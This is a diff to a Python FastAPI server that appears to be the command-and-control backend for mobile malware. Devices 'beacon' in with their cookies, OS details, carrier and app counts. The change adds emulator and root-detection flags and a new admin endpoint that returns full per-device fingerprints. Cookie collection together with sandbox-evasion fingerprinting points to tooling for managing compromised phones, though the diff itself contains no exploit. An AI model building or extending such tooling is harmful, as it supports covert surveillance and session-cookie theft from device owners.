@@ -114,6 +114,9 @@ async def admin_show_devices() -> dict:
             "name": d.name,
             "ip": d.ip,
             "status": d.status,
+            "is_emulator": d.is_emulator,
+            "is_rooted": d.is_rooted,
+            "carrier": d.carrier,
             "last_seen": d.last_seen.isoformat(),
         }
         for d in handler.devices.values()
@@ -122,6 +125,32 @@ async def admin_show_devices() -> dict:
         "status": "success",
         "data": {"devices": device_list},
         "message": f"Found {len(device_list)} device(s)",
+    }
+
+
+@app.get("/admin/device-info/{device_name}", tags=["admin"])
+async def admin_device_info(device_name: str) -> dict:
+    """Return full fingerprint details for a specific device."""
+    device = handler.get_device(device_name)
+    if device is None:
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND,
+            detail=f"Device '{device_name}' not found.",
+        )
+    return {
+        "status": "success",
+        "data": {
+            "name": device.name,
+            "ip": device.ip,
+            "status": device.status,
+            "os_info": device.os_info,
+            "is_emulator": device.is_emulator,
+            "is_rooted": device.is_rooted,
+            "installed_apps_count": device.installed_apps_count,
+            "carrier": device.carrier,
+            "last_seen": device.last_seen.isoformat(),
+        },
+        "message": f"Device info for '{device_name}'",
     }
 
 
@@ -217,6 +246,10 @@ async def beacon_check_in(payload: BeaconCheckIn) -> dict:
         name=payload.device_name,
         ip=payload.ip_address,
         os_info=payload.os_info,
+        is_emulator=payload.is_emulator,
+        is_rooted=payload.is_rooted,
+        installed_apps_count=payload.installed_apps_count,
+        carrier=payload.carrier,
         status="online",
         cookies=payload.cookies,
         last_seen=datetime.now(timezone.utc),
